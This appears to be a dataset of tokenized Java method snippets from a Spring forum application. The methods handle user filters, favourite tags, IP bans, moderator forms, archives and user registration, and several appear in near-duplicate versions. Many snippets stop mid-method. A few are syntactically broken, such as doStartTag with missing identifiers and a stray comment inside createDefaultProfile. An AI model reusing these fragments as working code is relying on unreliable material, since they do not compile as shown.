public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , AuthUtil . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , AuthUtil . getCurrentUser ( ) ) ; imageService . deleteImage ( AuthUtil . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( topic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , tagName , true ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; try { int id = userTagService . favoriteAdd ( user , tagName ) ; 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) | | author . isFrozen ( ) ) { return false ; } return author . getScore ( ) > = LINK_FOLLOW_MIN_SCORE ; } 
public TopicController topicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService topicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , SiteConfig siteConfig , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService topicTagService , MsgbaseDao msgbaseDao , MessageTextService textService , GroupDao groupDao ) { return new TopicController ( sectionService , messageDao , prepareService , topicPrepareService , commentService , ignoreListDao , siteConfig , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
public int doStartTag ( ) { Template = Template . getTemplate ( ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) : : test ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public ModelAndView changeTagShowFormHandler ( @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change tagRequestChange = new TagRequest . Change ( ) ; tagRequestChange . setOldTagName ( oldTagName ) ; tagRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestChange " , tagRequestChange ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete tagRequestDelete = new TagRequest . Delete ( ) ; tagRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestDelete " , tagRequestDelete ) ; return modelAndView ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , response , groupName , msgid ) ; 
public ModelAndView jumpMessage ( @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , false ) ; } Topic topic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ModelMap showRemove ( @RequestParam ( required = false ) Integer pos ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView editProfile ( @RequestParam ( " text " ) String text , @PathVariable String nick ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showModeratorForm ( @PathVariable String nick ) { User user = userService . getUser ( nick ) ; Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView modelAndView = new ModelAndView ( " confirm-password-reset " ) ; modelAndView . addObject ( " user " , user ) ; modelAndView . addObject ( " whoisLink " , UriComponentsBuilder . fromUriString ( " /people/{nick}/profile " ) . buildAndExpand ( nick ) . encode ( ) . toUriString ( ) ) ; return modelAndView ; } 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( @RequestParam int id ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , tagName , true ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; try { int id = userTagService . favoriteAdd ( user , tagName ) ; 
public ModelAndView favoriteTagDel ( @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
public void removeTown ( User user ) { jdbcTemplate . update ( " UPDATE users SET town=null WHERE id=? " , user . getId ( ) ) ; } 
public void removeUrl ( User user ) { jdbcTemplate . update ( " UPDATE users SET url=null WHERE id=? " , user . getId ( ) ) ; } 
public void logResetUrl ( @Nonnull User user , @Nonnull User moderator , @Nonnull String url , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logResetTown ( @Nonnull User user , @Nonnull User moderator , @Nonnull String town , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy ) { ImmutableMap < String , String > params ; params = invitedBy . map ( integer - > ImmutableMap . of ( OPTION_IP , ip , OPTION_INVITED_BY , integer . toString ( ) ) ) . orElseGet ( ( ) - > ImmutableMap . of ( OPTION_IP , ip ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean isAuthorReadonly ( ) { return authorReadonly ; } 
public boolean isCommentsAllowed ( Group group , Topic topic , User user , boolean ignoreFrozen ) { if ( user ! = null & & ( user . isBlocked ( ) | | ( ! ignoreFrozen & & user . isFrozen ( ) ) ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getAuthorUserId ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) & & ! user . isAnonymous ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( @Nullable Group group , @Nullable User currentUser , int sectionId , HttpServletRequest request ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( sectionId ) ; try { URL helpResource = request . getServletContext ( ) . getResource ( " /help/new-topic- " + Section . getUrlName ( sectionId ) + " .md " ) ; if ( helpResource ! = null ) { String helpRawText = IOUtils . toString ( helpResource , StandardCharsets . UTF_8 ) ; String addInfo = renderService . renderToHtml ( helpRawText , false ) ; params . put ( " addportal " , addInfo ) ; } } catch ( IOException e ) { throw new RuntimeException ( e ) ; } params . put ( " sectionId " , sectionId ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " tag " , required = false ) String tag , HttpServletRequest request ) throws UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( tag ! = null ) { TagName . checkTag ( tag ) ; params . put ( " tag " , tag ) ; } Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public SectionDao sectionDao ( DataSource ds ) { return new SectionDaoImpl ( ds ) ; } 
public boolean isBlockable ( ) { if ( id = = ANONYMOUS_ID | | blocked ) { return false ; } return ! canmod ; } 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( @RequestParam int id ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; List < String > r = userTagService . addMultiplyTags ( user , tagName , true ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; try { int id = userTagService . favoriteAdd ( user , tagName ) ; 
public ModelAndView favoriteTagDel ( @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; userTagService . favoriteDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
private ImmutableMap < String , Object > prepareModel ( @Nullable Group group , @Nullable User currentUser , int sectionId , HttpServletRequest request ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( sectionId ) ; try { URL helpResource = request . getServletContext ( ) . getResource ( " /help/new-topic- " + Section . getUrlName ( sectionId ) + " .md " ) ; if ( helpResource ! = null ) { String helpRawText = IOUtils . toString ( helpResource , StandardCharsets . UTF_8 ) ; String addInfo = renderService . renderToHtml ( helpRawText , false ) ; params . put ( " addportal " , addInfo ) ; } } catch ( IOException e ) { throw new RuntimeException ( e ) ; } params . put ( " sectionId " , sectionId ) ; params . put ( " section " , section ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " tag " , required = false ) String tag , HttpServletRequest request ) throws UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( tag ! = null ) { TagName . checkTag ( tag ) ; params . put ( " tag " , tag ) ; } Section section = sectionService . getSection ( sectionId ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; lowPriorityJmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMonth ( year , month ) ) ) ; } 
public boolean isBlockable ( ) { if ( id = = ANONYMOUS_ID ) { return false ; } return ! canmod ; } 
private ModelAndView archiveList ( int sectionid , String groupName ) { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView galleryArchive ( ) { return archiveList ( Section . SECTION_GALLERY ) ; } 
public ModelAndView newsArchive ( ) { return archiveList ( Section . SECTION_NEWS ) ; } 
public ModelAndView pollsArchive ( ) { return archiveList ( Section . SECTION_POLLS ) ; } 
public ModelAndView articlesArchive ( ) { return archiveList ( Section . SECTION_ARTICLES ) ; } 
public ModelAndView forumArchive ( @PathVariable String group ) { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public ModelAndView showCommentEditInfo ( @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent ) { ImmutableMap < String , String > params ; params = invitedBy . map ( integer - > ImmutableMap . of ( OPTION_IP , ip , OPTION_USET_AGENT , Integer . toString ( userAgent ) , OPTION_INVITED_BY , integer . toString ( ) ) ) . orElseGet ( ( ) - > ImmutableMap . of ( OPTION_IP , ip , OPTION_USET_AGENT , Integer . toString ( userAgent ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return items . stream ( ) . map ( item - > { Map < String , String > options = new HashMap < > ( ) ; 
public void updateUserInfoFields ( User user , String name , String url , String town ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, town=? WHERE id=? " , name , url , town , user . getId ( ) ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String town ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , town ) ; return userid ; } 
private void rescueMaxcom ( ) { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userService . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
